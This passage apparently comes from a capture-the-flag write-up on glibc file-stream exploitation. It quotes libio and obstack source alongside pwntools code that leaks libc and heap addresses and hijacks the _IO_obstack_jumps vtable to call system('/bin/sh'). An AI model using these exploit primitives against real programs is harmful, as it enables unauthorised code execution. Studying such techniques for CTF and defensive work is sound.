class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p><strong>Condition</strong>:<br><code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</code> &gt;&#x3D; <code>sizeof(uint8_t* )</code>, <code>(_f)-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>target</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is the save buffer that has been allocated and switched in <code>_IO_default_pbackfail</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p><p>The leak phase gives for me something like this:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do_allocate</span></span><br><span class="line">partial_write(pwn.p8(<span class="number">0xa8</span>), File.vtable)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_file_underflow =&gt; _IO_default_pbackfail</span></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x60</span>), File.vtable)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line">write_ptr(pwn.p64(<span class="number">0xfbad1800</span> | <span class="number">0x8000</span>), File.flags)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x70</span>), File._IO_write_base)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x78</span>), File._IO_write_ptr)</span><br><span class="line">partial_write(pwn.p8(<span class="number">0xa0</span>), File.vtable)</span><br><span class="line">write_ptr(pwn.p64(<span class="number">1</span>), File.fileno)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line">leak = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2160c0</span> + <span class="number">0x2d160</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Heap-leak"><a href="#Heap-leak" class="headerlink" title="Heap leak"></a>Heap leak</h2><p>To use the <code>_IO_obstack_jumps</code> technique, we have to craft a custom <code>obstack</code> structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that’s very easy, within the <code>main_arena</code> are stored some heap pointers, which means we just have to use the same <code>_IO_fflush</code> trick to flush the filestream and then leak a heap pointer stored in the <code>main_arena</code>. I wrote a function that leaks directly the right pointer from a given address:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We assume flags are right</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    write_ptr(ptr, File._IO_write_base)</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="built_in">int</span>.from_bytes(ptr, byteorder=<span class="string">&quot;little&quot;</span>)+<span class="number">8</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    write_ptr(dest, File._IO_write_ptr)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    ret = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">leak_main_arena = leak + <span class="number">0x1ed5a0</span></span><br><span class="line"></span><br><span class="line">heap = leak_ptr(pwn.p64(leak_main_arena)) - <span class="number">0x2a0</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="obstack-exploitation"><a href="#obstack-exploitation" class="headerlink" title="obstack exploitation"></a>obstack exploitation</h2><p>As far I know, <code>obstack</code> has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the <code>_IO_obstack_jumps</code> vtable looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">    JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">    JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">    JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Given when <code>_IO_SYNC</code> is called in <code>_IO_fflush</code> the second argument is <code>0x1</code>, we cannot call functions like <code>_IO_obstack_xsputn</code> that need buffer as arguments, that’s the reason why we have to dig into <code>_IO_obstack_overflow</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>struct _IO_obstack_file</code> is defined as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Which means right after the <code>vtable</code> field within the file stream should be a pointer toward a <code>struct obstack</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Once <code>obstack_1grow</code> is called, if <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>, <code>_obstack_newchunk</code> gets called.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p><strong>Condition</strong>: <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate a new current chunk for the obstack *H</span></span><br><span class="line"><span class="comment">   on the assumption that LENGTH bytes need to be added</span></span><br><span class="line"><span class="comment">   to the current object, or a new object of length LENGTH allocated.</span></span><br><span class="line"><span class="comment">   Copies any partial object from the end of the old chunk</span></span><br><span class="line"><span class="comment">   to the beginning of the new one.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="type">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="type">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">((COPYING_UNIT *) object_base)[i]</span><br><span class="line">  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment"> but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment"> which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">  == __PTR_ALIGN ((<span class="type">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">libc_hidden_def (_obstack_newchunk)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>The interesting part of the function is the call to the <code>CALL_CHUNKFUN</code> macro that calls a raw <em>unencrypted</em> function pointer referenced by the <code>obstack</code> structure with either a controlled argument (<code>(h)-&gt;extra_arg</code>) or only with the size.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_FREEFUN(h, old_chunk) \</span></span><br><span class="line"><span class="meta">  do &#123; \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> ((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">(*(h)-&gt;freefun)((h)-&gt;extra_arg, (old_chunk));      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">(*(void (*)(void *))(h)-&gt;freefun)((old_chunk));      \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>If I summarize, to call <code>system(&quot;/bin/sh&quot;</code> we need to have:</p><ul><li><code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code></li><li><code>(h)-&gt;freefun</code> &#x3D; <code>&amp;system</code></li><li><code>(h)-&gt;extra_arg</code> &#x3D; <code>&amp;&quot;/bin/sh&quot;</code></li><li><code>(h)-&gt;use_extra_arg</code> !&#x3D; 0</li></ul><p>Which gives:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_IO_obstack_jumps = leak + <span class="number">0x1E9260</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;_IO_obstack_jumps: <span class="subst">&#123;<span class="built_in">hex</span>(_IO_obstack_jumps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit vtable =&gt; _IO_obstack_jumps</span></span><br><span class="line">write_ptr(pwn.p64(_IO_obstack_jumps - <span class="number">8</span> * <span class="number">9</span>), File.vtable)</span><br><span class="line">write_ptr(pwn.p64(heap + <span class="number">0x2a0</span>), File.obstack)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0xff</span>), File._IO_read_base)</span><br><span class="line"></span><br><span class="line">write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) <span class="comment"># fn ptr, system</span></span><br><span class="line">write_ptr(pwn.p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))), obstack.extra_arg) <span class="comment"># arg</span></span><br><span class="line">partial_write(pwn.p8(<span class="literal">True</span>), obstack.use_extra_arg)</span><br><span class="line"></span><br><span class="line">fflush()</span><br><span class="line"><span class="comment"># 